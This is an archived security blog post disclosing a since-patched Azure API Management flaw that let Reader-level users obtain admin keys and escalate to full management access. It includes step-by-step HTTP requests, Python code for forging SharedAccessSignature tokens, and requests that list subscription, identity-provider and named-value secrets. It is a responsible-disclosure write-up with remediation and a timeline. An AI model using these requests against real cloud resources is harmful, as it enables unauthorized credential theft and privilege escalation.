---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-09-13_escalating-from-reader-to-contributor-in-azure-api-management.md
original_filename: 2024-09-13_escalating-from-reader-to-contributor-in-azure-api-management.md
title: Escalating From Reader To Contributor In Azure API Management
category: documents
detected_topics:
- access-control
- api-security
- sso
- command-injection
- otp
- cloud-security
tags:
- imported
- documents
- access-control
- api-security
- sso
- command-injection
- otp
- cloud-security
language: en
raw_sha256: 4f85feddba58f6c2869bfba282f25aca11f844d29a55f9843d79337ebb5af7ab
text_sha256: 4b66d88c05e5e8bcb59fe7a2c84fd91204a23c66e535d12dd3455fb6101ebb56
ingested_at: '2026-06-28T07:32:38Z'
sensitivity: unknown
redactions_applied: false
---

# Escalating From Reader To Contributor In Azure API Management

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-09-13_escalating-from-reader-to-contributor-in-azure-api-management.md
- Source Type: markdown
- Detected Topics: access-control, api-security, sso, command-injection, otp, cloud-security
- Ingested At: 2026-06-28T07:32:38Z
- Redactions Applied: False
- Raw SHA256: `4f85feddba58f6c2869bfba282f25aca11f844d29a55f9843d79337ebb5af7ab`
- Text SHA256: `4b66d88c05e5e8bcb59fe7a2c84fd91204a23c66e535d12dd3455fb6101ebb56`


## Content

---
title: "Escalating From Reader To Contributor In Azure API Management"
page_title: "Escalating from Reader to Contributor in Azure API Management"
url: "https://binarysecurity.no/posts/2024/09/apim-privilege-escalation"
final_url: "https://binarysecurity.no/posts/2024/09/apim-privilege-escalation"
authors: ["Christian Håland"]
programs: ["Microsoft (Azure)"]
bugs: ["Privilege escalation"]
publication_date: "2024-09-13"
added_date: "2024-09-18"
source: "pentester.land/writeups.json"
original_index: 5
---

This blog post shows how a user with [`Reader`](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles/general#reader)-level access to an [Azure API Management](https://learn.microsoft.com/en-us/azure/api-management/) resource actually had the equivalent of `Contributor`-level access, allowing the user to read, _modify_ and even _delete_ configurations of the resource via the [Direct Management API](https://learn.microsoft.com/en-us/rest/api/apimanagement/apimanagementrest/api-management-rest). This was possible because a regular user with read access to the Azure APIM resource was allowed to read the `keys` of any [APIM user](https://learn.microsoft.com/en-us/azure/api-management/api-management-howto-create-or-invite-developers) via the [Azure Resource Manager Rest API](https://learn.microsoft.com/en-us/rest/api/resources/). The keys can be used to generate [`SharedAccessSignatures`](https://learn.microsoft.com/en-us/rest/api/apimanagement/apimanagementrest/azure-api-management-rest-api-authentication#ManuallyCreateToken) to authenticate to the Direct Management API, giving access to perform any management operation on the API Management resource.

When reading or deploying an Azure API Management resource in the Azure Portal or through ARM/Bicep templates, the Azure Resource Manager (ARM) API is used.

The ARM API restricts certain actions when a user with `Reader` permissions browses the APIM resource. Older versions of the ARM API would allow a user with Reader access to view all subscription keys (often required to talk to an API exposed via APIM), read the client credentials of any identity provider service principal, and read the keys used to interact with the Direct Management API. Microsoft therefore added an option to enforce a minimum ARM API version to make older, vulnerable versions inaccessible (this has to be applied per resource).

ARM API versions look like this in the query string of the URL: `api-version=2019-12-01`. If the minimum API restriction is configured to an API newer than e.g. 2020, then a user with `Reader` access can no longer view subscription keys for all users and will be presented with a “No access”-dialog and a 403 forbidden from the ARM API. The same is true when trying to access named values marked as “secret”. However, the bug presented in this blog post bypasses these restrictions because it allows access to the keys belonging to the admin user (which is created by default and seemingly can’t be deleted) and the keys can be used to create so-called [`SharedAccessSignatures`](https://learn.microsoft.com/en-us/rest/api/apimanagement/apimanagementrest/azure-api-management-rest-api-authentication#ManuallyCreateToken).

![Setting the minimum API version for the APIM instance. This does not stop this bug though...](/assets/images/posts/2024_apim_privesc_minimum_api_version.png)

## The Direct Management API

The Direct Management API of an APIM instance can be found at `<resource_name>.management.azure-api.net` and according to Microsoft documentation provides the following:

> Azure API Management provides a direct management REST API for performing operations on selected entities, such as users, groups, products, and subscriptions.

By default when creating an Azure APIM resource, there is an Admin user setup. This user is almighty when it comes to the above “selected entities” and can basically do anything to them.

![Here is the default admin user for whom we list the keys.](/assets/images/posts/2024_apim_privesc_admin_user.png)

The [documentation](https://learn.microsoft.com/en-us/rest/api/apimanagement/apimanagementrest/api-management-rest) suggests that it needs to be “enabled” to be able to use it, but it seems that “enabling” it simply means generating another key for it, which can not be done by users with “reader”-access.

![This switch is really confusing the issue as it is set to No by default...](/assets/images/posts/2024_apim_privesc_apim_direct_management_api.png)

## The bug

The bug is as simple as finding the right ARM API endpoint and calling it with “Reader”-privileges. This API endpoint was probably missed when the API-version restrictions mentioned in the intro of the blog post was implemented to fix the fact that all kinds of entities were accessible to a Reader in the older versions of the APIs.

One more thing that is a bit confusing is that the Azure Portal GUI suggests that the APIM Direct Management API is disabled unless a switch is toggled to turn it on. This is not the case as the management API is always there and accessible to anyone able to authenticate (or not, if the version-restrictions aren’t enabled..).

More on that in another blog post.

## Demonstrating the bug

  1. Read the keys of the admin user (userid = 1) with the following request. We can get the list of users with the same API call by shortening the URL to `/users/`, the Bearer token can be taken from the Azure Portal for instance:

  
  
  GET /subscriptions/<subscription>/resourceGroups/<resource_group>/providers/Microsoft.ApiManagement/service/<instance_name>/users/1/keys?api-version=2023-03-01-preview HTTP/2
  Host: management.azure.com
  Authorization: Bearer <legitimate_arm_bearer_token>
  
  HTTP/2 200 OK
  Server: Microsoft-HTTPAPI/2.0
  Date: Tue, 30 Apr 2024 14:01:17 GMT
  
  {"primary":"gn/1UgiWSUgOY4ZEwpnZ1yQC1l42vmksaWB1Ooa/LtLPBZsMQNb48TvOSwllBqbJQQRCl+6XrJykImPtqAd8CQ==", "secondary":"Rn7+ZL8S+K9T1lOHrfPboXQOFB3fkMG7/p870+KO+ckKISyBQych7UYgQW9lbRPdSnHBgcHYS5TGtbpITPiPxA=="}
  

  2. Generate a `SignedAccessSignature` that can be used to interact with the APIM Management API. By default this is available at `<service_name>.management.azure-api.net`:

  
  
  def get_expiry(self):
  # 2014-08-04T22:03:00.0000000Z
  return (datetime.datetime.utcnow() + datetime.timedelta(hours=24)).strftime("%Y-%m-%dT%H:%M:%S.0000000Z")
  
  def generate_apim_sas_token(self, key, uid, version=1):
  """
  Generate an Azure SAS token,HMAC-SHA-512, given a UID and a key
  https://learn.microsoft.com/en-gb/rest/api/apimanagement/apimanagementrest/azure-api-management-rest-api-authentication
  """
  exp = self.get_expiry()
  if version == 1:
  message = f"uid={uid}&ex={exp}"
  message_to_sign = f"{uid}\n{exp}"
  signature = base64.b64encode(self.hmac_sha512(message_to_sign, key)).decode("utf-8")
  sas_token = f"{message}&sn={signature}"
  
  if version == 2:
  message = f"{uid}&202712120500"
  message_to_sign = f"{uid}\n{exp}"
  signature = base64.b64encode(self.hmac_sha512(message_to_sign, key)).decode("utf-8")
  sas_token = f"{message}&{signature}"
  
  return sas_token
  

  3. Call the management API, authenticating with the `Authorization: SharedAccessSignature xyz` header:

  
  
  GET /subscription/0/resourceGroups/0/providers/Microsoft.ApiManagement/service/0/ HTTP/1.1
  Host: <service>.management.azure-api.net
  Authorization: SharedAccessSignature uid=1&ex=2024-05-01T00:00:00:000000Z&sn=ABCDEFG==
  

  4. As the administrator user we can now list subscription keys:

  
  
  POST /subscription/0/resourceGroups/0/providers/Microsoft.ApiManagement/service/0/subscriptions/<sub_id>/listSecrets?api-version=2022-08-01 HTTP/1.1
  Host: <service>.management.azure-api.net
  Authorization: SharedAccessSignature uid=1&ex=2024-05-01T00:00:00:000000Z&sn=ABCDEFG==
  Content-Length: 0
  Content-Type: application/json
  

List identity provider keys, which could give further access into Azure or Entra ID:
  
  
  POST /subscription/0/resourceGroups/0/providers/Microsoft.ApiManagement/service/0/identityProviders/aad/listSecrets?api-version=2022-08-01 HTTP/1.1
  Host: <service>.management.azure-api.net
  Authorization: SharedAccessSignature uid=1&ex=2024-05-01T00:00:00:000000Z&sn=ABCDEFG==
  Content-Length: 0
  Content-Type: application/json
  

List Named Value secrets, which will often include any integration secrets or backend authentication information which could grant access to further systems as well:
  
  
  POST /subscription/0/resourceGroups/0/providers/Microsoft.ApiManagement/service/0/namedValues/<namedValueId/listValue?api-version=2022-08-01 HTTP/1.1
  Host: <service>.management.azure-api.net
  Authorization: SharedAccessSignature uid=1&ex=2024-05-01T00:00:00:000000Z&sn=ABCDEFG==
  Content-Length: 0
  Content-Type: application/json
  

## Remediation

Microsoft fixed this in a little over a month by simply restricting this ARM API for users with “Reader” privileges. The fix seems to be sufficient and has been applied retroactively to all instances of APIM from what we can tell.

We have seen several of these kinds of vulnerabilities in Azure resources, and it’s quite likely that more will turn up in the future. To build defense in depth, we recommend that critical Azure resources are made private only available from their own VNET and, depending on deployment flavor, the CI/CD runners.

The bug was classified as:
  
  
  Severity: Important 
  Security Impact: Elevation of Privilege 
  

## Timeline

  * April 30, 2024 - Reported to MSRC after finding the bug
  * May 17 2024 - Prompted for update
  * May 21, 2024 - Bug Bounty awarded
  * June 4, 2024 - Fix was reported and confirmed
